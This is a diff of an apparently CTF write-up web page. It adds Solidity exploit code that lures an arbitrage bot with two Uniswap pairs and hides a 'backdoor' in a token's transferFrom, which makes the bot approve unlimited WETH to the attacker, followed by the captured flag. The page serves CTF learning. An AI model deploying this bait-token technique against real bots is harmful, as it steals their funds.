+<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">totalSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">IUniswapV2Callee</span><span class="w"> </span><span class="nx">bot</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">weth</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">hacked</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">event</span><span class="w">  </span><span class="nx">Approval</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">guy</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">event</span><span class="w">  </span><span class="nx">Transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w">                       </span><span class="kr">public</span><span class="w">  </span><span class="nx">balanceOf</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">))</span><span class="w">  </span><span class="kr">public</span><span class="w">  </span><span class="nx">allowance</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">IUniswapV2Callee</span><span class="w"> </span><span class="nx">_bot</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_weth</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">totalSupply</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">weth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_weth</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">bot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_bot</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">guy</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">allowance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">][</span><span class="nx">guy</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Approval</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">guy</span><span class="p">,</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span>
+<span class="w">        </span><span class="kr">public</span>
+<span class="w">        </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">backdoor</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">src</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">src</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">allowance</span><span class="p">[</span><span class="nx">src</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint</span><span class="p">).</span><span class="nx">max</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">require</span><span class="p">(</span><span class="nx">allowance</span><span class="p">[</span><span class="nx">src</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">allowance</span><span class="p">[</span><span class="nx">src</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">src</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">dst</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
+
+<span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Transfer</span><span class="p">(</span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">backdoor</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">hacked</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">owner</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">addressList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">calldataList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">addressList</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">weth</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">calldataList</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span>
+<span class="w">                </span><span class="s2">&quot;approve(address,uint256)&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nx">owner</span><span class="p">,</span>
+<span class="w">                </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint</span><span class="p">).</span><span class="nx">max</span>
+<span class="w">            </span><span class="p">);</span>
+<span class="w">            </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span>
+<span class="w">                </span><span class="nx">addressList</span><span class="p">,</span>
+<span class="w">                </span><span class="nx">calldataList</span>
+<span class="w">            </span><span class="p">);</span>
+<span class="w">            </span><span class="nx">bot</span><span class="p">.</span><span class="nx">uniswapV2Call</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">hacked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span>
+<span class="w">        </span><span class="nx">IUniswapV2Factory</span><span class="w"> </span><span class="nx">factory1</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">IUniswapV2Factory</span><span class="w"> </span><span class="nx">factory2</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">IWETH</span><span class="w"> </span><span class="nx">weth</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">IUniswapV2Callee</span><span class="w"> </span><span class="nx">bot</span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">HackToken</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">HackToken</span><span class="p">(</span><span class="nx">bot</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">pair1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">factory1</span><span class="p">.</span><span class="nx">createPair</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">pair2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">factory2</span><span class="p">.</span><span class="nx">createPair</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">));</span>
+
+<span class="w">        </span><span class="nx">weth</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}();</span>
+
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">weth</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="nx">ether</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="nx">ether</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">IUniswapV2Pair</span><span class="p">(</span><span class="nx">pair1</span><span class="p">).</span><span class="nx">mint</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">weth</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="nx">ether</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="mf">0.2</span><span class="w"> </span><span class="nx">ether</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">IUniswapV2Pair</span><span class="p">(</span><span class="nx">pair2</span><span class="p">).</span><span class="nx">mint</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h4 id="flag_2">Flag<a class="headerlink" href="#flag_2" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>flag{RuN_Ur_0wn_B0T_4_FuN_&amp;_Pr0f1t:)b7e0a89554}</p>
 </blockquote>
 
   <hr>
@@ -4131,7 +4354,7 @@
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年6月19日 23:10:59</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年8月6日 11:12:28</span>
       
     
   </small>
@@ -4225,7 +4448,7 @@
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../operation_feathered_fortune_fiasco/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Operation Feathered Fortune Fiasco" rel="prev">
+        <a href="../tokyo_payload/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Tokyo Payload" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -4234,20 +4457,20 @@
               <span class="md-footer__direction">
                 上一页
               </span>
-              Operation Feathered Fortune Fiasco
+              Tokyo Payload
             </div>
           </div>
         </a>
       
       
         
-        <a href="../pigeon_vault/" class="md-footer__link md-footer__link--next" aria-label="下一页: Pigeon Vault" rel="next">
+        <a href="../paradigm/one_hundred_percent/" class="md-footer__link md-footer__link--next" aria-label="下一页: 100%" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 下一页
               </span>
-              Pigeon Vault
+              100%
             </div>
           </div>
           <div class="md-footer__button md-icon">
